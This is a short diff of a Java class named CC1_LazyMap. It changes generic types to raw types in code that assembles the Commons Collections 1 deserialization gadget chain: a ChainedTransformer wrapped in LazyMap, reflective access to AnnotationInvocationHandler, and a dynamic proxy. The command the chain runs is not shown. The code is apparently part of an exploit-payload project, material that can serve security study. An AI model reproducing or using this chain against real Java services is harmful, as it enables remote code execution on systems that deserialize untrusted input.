@@ -23,11 +23,11 @@ public class CC1_LazyMap {
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-        HashMap<Object, Object> map = new HashMap<>();
-        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
+        HashMap map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
 
-        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor<?> declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
         declaredConstructor.setAccessible(true);
         InvocationHandler annotationInvocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);
         Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), map.getClass().getInterfaces(), annotationInvocationHandler);
